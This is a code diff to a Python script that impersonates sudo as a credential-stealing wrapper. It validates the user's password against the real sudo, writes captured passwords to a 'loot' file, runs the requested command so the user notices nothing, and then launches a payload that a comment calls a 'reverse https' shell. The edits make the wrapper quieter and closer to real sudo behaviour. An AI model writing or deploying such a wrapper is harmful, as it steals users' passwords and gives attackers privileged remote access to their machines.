@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-realSudo = "REAL_SUDO_HERE"
+realSudo = "/usr/bin/sudo" #"REAL_SUDO_HERE"
 pythonInterpreter = "PYTHON_EXECUTABLE_GOES_HERE"
 
 def cantLoadModuleError():
@@ -67,6 +67,7 @@ def validSudoPassword(password):
     command = [realSudo, "-S", "-b", "echo", "Echo this"]
     wrapper = subprocess.Popen(command, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
     wrapper.communicate(password + "\n")
+    #wrapper.terminate()
     return not wrapper.returncode
 
 def getPayloadFile():
@@ -86,7 +87,7 @@ def silencePayloadFile():  #if there is an error making our reverse https, such 
         payloadFile.write(payload)
         payloadFile.close()
 
-def blueTurtleShell(password):
+def blueTurtleShell(password):  #we are going to give it a password here.  It won't cause a problem if it is not needed, and it might be needed if the user was doing some long process for the sudo.
     import subprocess
     import os
     payloadFile = getPayloadFile()
@@ -96,20 +97,15 @@ def blueTurtleShell(password):
     hackTheGibson = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
     hackTheGibson.communicate(password + "\n")
 
-def runIntendedSudoCommand(validatedSudoPassword):
+def runIntendedSudoCommand():  #we won't need a password here, since we just got a good sudo when we verified their password
     import sys
-    import subprocess
+    import os
     args = sys.argv[1:]
     for index, arg in enumerate(args):
         if arg == "sudo":
             args[index] = realSudo
-    if not type(validatedSudoPassword) == type(None):
-        command = " ".join([realSudo, "-S"] + args)
-        runner = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
-        runner.communicate(validatedSudoPassword + "\n")
-    else:
-        command = " ".join([realSudo] + args)
-        runner = subprocess.Popen(command, shell = True)
+    command = " ".join([realSudo, "-S"] + args)
+    os.system(command)  #not using subprocess.  Usually the ability to mess with stdin/out/err is useful, but it just gets in the way of delivering the true user experience here.  Especially if they use something interactive like vim.
     
 def getSudoPassword(allowedAttempts = 3):
     import getpass
@@ -129,7 +125,12 @@ def getSudoPassword(allowedAttempts = 3):
             if not i == allowedAttempts - 1:
                 print(fail)
     if not success:
+        import sys
         print(epicFail)
+        sys.stdout = open("/dev/null", 'w')  #sometimes this generates stray outputs if there are three failed attempts.  Sending them to limbo.
+        sys.stderr = open("/dev/null", 'w')
+        sys.stdout.flush()
+        sys.stderr.flush()
         quit()
     return (user, password, True)
 
@@ -160,30 +161,37 @@ def parseArguments():
     else:
         return argList
 
-if __name__ == '__main__':
-    try:
-        parseArguments()
-        lootFile = getLootFileName()
-        loot = loadLootFile(lootFile)
-    except:
-        pass
+
+def prewrap():
+    parseArguments()
+    lootFile = getLootFileName()
+    loot = loadLootFile(lootFile)
     try:
         user, password, passwordNeeded = getSudoPassword()
     except:
+        user = None
         password = None
-    try:
-        if passwordNeeded:
-            loot[user] = password
+        passwordNeeded = True
+    if passwordNeeded and user:
+        loot[user] = password
+    if loot:
         saveLootFile(loot, lootFile)
+    return (user, password, passwordNeeded, loot)    
+
+def postwrap(user, password, loot):
+    if not passwordNeeded:
+        if user:
+            password = loot[user]
+    blueTurtleShell(password)    
+
+if __name__ == '__main__':
+    parseArguments()
+    try:
+        user, password, passwordNeeded, loot = prewrap()
     except:
         pass
-    runIntendedSudoCommand(password)
+    runIntendedSudoCommand()
     try:
-        if not passwordNeeded:
-            try:
-                password = loot[user]
-            except:
-                pass
-        blueTurtleShell(password)
+        postwrap(user, password, loot)
     except:
-        pass    
+        pass
